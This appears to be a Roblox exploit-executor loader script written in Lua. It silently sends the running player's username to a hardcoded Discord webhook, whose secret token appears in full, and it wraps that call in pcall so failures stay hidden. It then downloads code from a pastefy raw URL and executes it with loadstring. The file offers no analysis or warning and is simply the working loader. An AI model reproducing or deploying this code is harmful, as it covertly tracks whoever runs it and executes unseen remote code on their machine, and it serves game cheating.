local HttpService = game:GetService("HttpService")
local req = (syn and syn.request) or http_request or (http and http.request) or request
local WEBHOOK = "https://discord.com/api/webhooks/1461266488659939431/Pjw5sQjJjRINTkTIHqA5OX-LwoFnIvNSxlZpfgUBb5uzZ1JHxHIDMnOWU4WWRH7zuEea"

pcall(function()
    req({
        Url = WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            embeds = {{title = game.Players.LocalPlayer.Name}}
        })
    })
end)
loadstring(game:HttpGet("https://pastefy.app/XfPAABSD/raw", true))()
